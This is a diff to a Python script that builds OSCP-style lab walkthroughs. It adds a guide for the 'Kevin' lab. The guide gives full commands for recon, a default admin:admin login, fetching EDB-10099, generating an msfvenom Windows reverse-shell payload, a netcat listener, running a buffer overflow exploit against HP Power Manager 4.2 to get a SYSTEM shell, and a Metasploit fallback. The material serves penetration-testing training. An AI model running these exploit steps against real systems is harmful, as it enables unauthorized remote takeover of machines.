@@ -221,8 +221,49 @@ clamav = {
     '👑 RCE as a root service means a **direct root shell**, no privesc stage.'],
 }
 
+kevin = {
+  'title': 'Windows · HP Power Manager BOF → direct SYSTEM',
+  'ips': {'K': '192.168.45.180', 'T': '192.168.153.58'},
+  'steps': [
+    {'h': 'Recon', 'b': [
+      P('The overflow lands you straight as SYSTEM, so there\'s **no separate privesc**.'),
+      C('sudo nmap -p- --min-rate 5000 -Pn {T} -oN kevin_ports.txt\nsudo nmap -sC -sV -p 80,135,139,445,3389 -Pn {T} -oN kevin_svc.txt'),
+      O('80/tcp   open  http          HP Power Manager\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server'),
+      P('🎯 The lead is the **web app on port 80**.')]},
+    {'h': 'Enumerate the web app', 'b': [
+      C('curl -s -I http://{T}/'),
+      P('Open `http://{T}/`: it\'s the **HP Power Manager Administration** login. Log in with the default **admin : admin**.'),
+      P('The banner shows **HP Power Manager 4.2 build 13**, which is vulnerable to a stack buffer overflow.')]},
+    {'h': 'Find the exploit', 'b': [
+      C('searchsploit hp power manager\nsearchsploit -m 10099'),
+      O("HP Power Manager 'formExportDataPoints' Buffer Overflow | 10099.pl")]},
+    {'h': 'Generate shellcode (bad chars matter)', 'b': [
+      C('msfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 \\\n  -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d" -f c -e x86/alpha_mixed EXITFUNC=thread'),
+      W('The payload goes in a POST body, so it must be URL-safe. The bad chars are null, CR, LF and `% & + =`. **alpha_mixed** keeps it alphanumeric.')]},
+    {'h': 'Edit and run EDB-10099', 'b': [
+      P('In `10099.pl`, set the **target IP**, paste the **shellcode** from the last step, and check the **return address** matches HPPM 4.2.'),
+      C('rlwrap nc -lvnp 443'),
+      C('perl 10099.pl {T}'),
+      O('C:\\Windows\\system32> whoami\nnt authority\\system'),
+      P('👑 Straight to **SYSTEM**.'),
+      W('Egress is filtered, so call back on **port 443** (or 80).')]},
+    {'h': 'Flags', 'b': [
+      C('type C:\\Users\\Administrator\\Desktop\\proof.txt\ndir C:\\Users /s /b | findstr local.txt', 'cmd'),
+      F('proof.txt captured 👑')]},
+  ],
+  'backup': {'h': 'Backup route: Metasploit (your one allowed use)', 'b': [
+    C('use exploit/windows/http/hp_power_manager_filename\nset RHOSTS {T}\nset LHOST {K}\nset LPORT 443\nset payload windows/shell_reverse_tcp\nrun', 'msf')]},
+  'takeaways': [
+    '🔑 Old admin panels: try **default creds** (admin:admin), then fingerprint the exact version.',
+    '🧬 For any public BOF, **regenerate the shellcode** with msfvenom. The bundled one is dead.',
+    '🚫 Respect **bad characters**: HTTP and login overflows usually kill `\\x00 \\x0a \\x0d % & + =`.',
+    '🌐 Callback not landing? **Egress filtering**: use port 443 or 80.',
+    '👑 A service that overflows while running as SYSTEM gives a **direct SYSTEM shell**.',
+    '1️⃣ Keep Metasploit as your **single allowed use**. Get the manual EDB route working first.'],
+}
+
 out = ('/* Step-by-step walkthroughs for labs, shown on the lab page.\n'
        '   Built by build_guides.py. {K} is your Kali IP and {T} the target IP. */\n'
-       'window.OSCP_GUIDES = ' + json.dumps({'pgp-jacko': jacko, 'pgp-nibbles': nibbles, 'pgp-bratarina': bratarina, 'pgp-clamav': clamav}, ensure_ascii=False, indent=1) + ';\n')
+       'window.OSCP_GUIDES = ' + json.dumps({'pgp-jacko': jacko, 'pgp-nibbles': nibbles, 'pgp-bratarina': bratarina, 'pgp-clamav': clamav, 'pgp-kevin': kevin}, ensure_ascii=False, indent=1) + ';\n')
 io.open(r'C:\Users\bhavi\Desktop\Personal_App\lib\oscp-guides.js', 'w', encoding='utf-8', newline='\n').write(out)
 print(len(out))
